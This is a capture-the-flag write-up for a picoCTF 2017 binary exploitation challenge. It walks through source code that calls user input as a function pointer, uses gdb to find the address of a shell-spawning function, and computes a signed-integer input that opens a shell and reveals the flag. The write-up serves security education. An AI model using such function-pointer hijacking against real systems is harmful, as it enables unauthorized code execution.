# Guess the Number
#### Writeup by Valar_Dragon
* **Binary Exploitation**
* *75 points*
* Description: Just a simple number-guessing game. How hard could it be? [Binary](guess_num) [Source](guess_num.c). Connect on shell2017.picoctf.com:49258.

Lets start by looking at the source code of this program!
```c
/* How well do you know your numbers? */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

void win(void) {
    printf("Congratulations! Have a shell:\n");
    system("/bin/sh -i");
}

int main(int argc, char **argv) {
    uintptr_t val;
    char buf[32] = "";

    /* Turn off buffering so we can see output right away */
    setbuf(stdout, NULL);

    printf("Welcome to the number guessing game!\n");
    printf("I'm thinking of a number. Can you guess it?\n");
    printf("Guess right and you get a shell!\n");

    printf("Enter your number: ");
    scanf("%32s", buf);
    val = strtol(buf, NULL, 10);

    printf("You entered %d. Let's see if it was right...\n", val);

    val >>= 4;
    ((void (*)(void))val)();
}
```
So it looks like we need to exploit `((void (*)(void))val)();` ,  since strtol is a secure way to copy the input.

`((void (*)(void))val)();` essentially means execute the void function located at memory address val. In our case, the function we want to execute is win, so we need to get its memory address from the Binary

To do this:
```
$ gdb ./guess_num
GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.2) 7.7.1
Copyright (C) 2014 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later
-snip-
Reading symbols from ./guess_num...(no debugging symbols found)...done.
(gdb) p win
$1 = {<text variable, no debug info>} 0x804852b <win>
```
The memory address we want is `0x804852b`, which is our final value of val.
The value for val we need inputted is

$$ 0x804852b << 4 $$
which is 2152223408.
If we try to enter that into the netcat session we get:
```
$ nc shell2017.picoctf.com 49258
Welcome to the number guessing game!
I'm thinking of a number. Can you guess it?
Guess right and you get a shell!
Enter your number: 2152223408
You entered 2147483647. Let's see if it was right...
```

2152223408 overflowed into 2147483647 (2**31 -1)! Its too big for a signed int! Lets look at the binary of 2152223408

`10000000010010000101001010110000`
The leading digit being a 1 means the number is negative in C. But that doesn't matter to us, as val is being bit shifted by 4 to the right, so that negative sign will go away! We just need to figure out what signed int in C has that binary. Negative numbers in C are `-2**31 + (remaining binary)`. The remaining binary is `10010000101001010110000` which is 4739760.

Thus the number we are looking for is $-2142743888$, because that will bitshift to 0x804852b, which is what we are looking for!

Trying that:

```
$ nc shell2017.picoctf.com 49258
Welcome to the number guessing game!
I'm thinking of a number. Can you guess it?
Guess right and you get a shell!
Enter your number: -2142743888
You entered -2142743888. Let's see if it was right...
Congratulations! Have a shell:
/bin/sh: 0: can't access tty; job control turned off
$ echo "W00T We got Shell!"
W00T We got Shell!
$ ls      
flag.txt
guess_num
xinetd_wrapper.sh
$ cat flag.txt
f2892be47d731c96e753d14c913fd757
```
